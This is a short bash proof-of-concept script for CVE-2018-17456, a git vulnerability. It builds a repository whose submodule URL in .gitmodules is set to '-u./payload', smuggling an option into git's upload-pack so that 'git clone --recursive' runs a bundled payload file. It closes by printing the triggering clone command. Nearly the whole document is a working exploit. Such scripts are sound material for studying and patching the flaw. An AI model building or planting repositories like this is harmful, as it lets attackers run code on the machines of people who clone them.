#!/bin/bash

set -e

# create a folder
folder="CVE-2018-17456-PoC"
mkdir "$folder"
cp payload "$folder/"
cd "$folder"

# create a submodule
repo_sub="Submodule"
git init "$repo_sub"
cd "$repo_sub"
touch anonymking
git add anonymking
git commit -m "submodule"
cd ..

# create and init a repo
repo="$PWD/CVE-2018-17456-PoC"
git init "$repo"
mv payload "$repo"
cd "$repo"

# add the submodule to repo
repo_submodule="./../$repo_sub"
repo_subname="exploit:exploit"
git submodule add "$repo_submodule" $repo_subname

# construct the eval project
git config -f .gitmodules --replace-all submodule."$repo_subname".url "-u./payload"
git add .
git commit -m "CVE-2018-17456"

# ued the following command to recur the vulnerability
echo "git clone --recursive \"$repo\" des_dir"
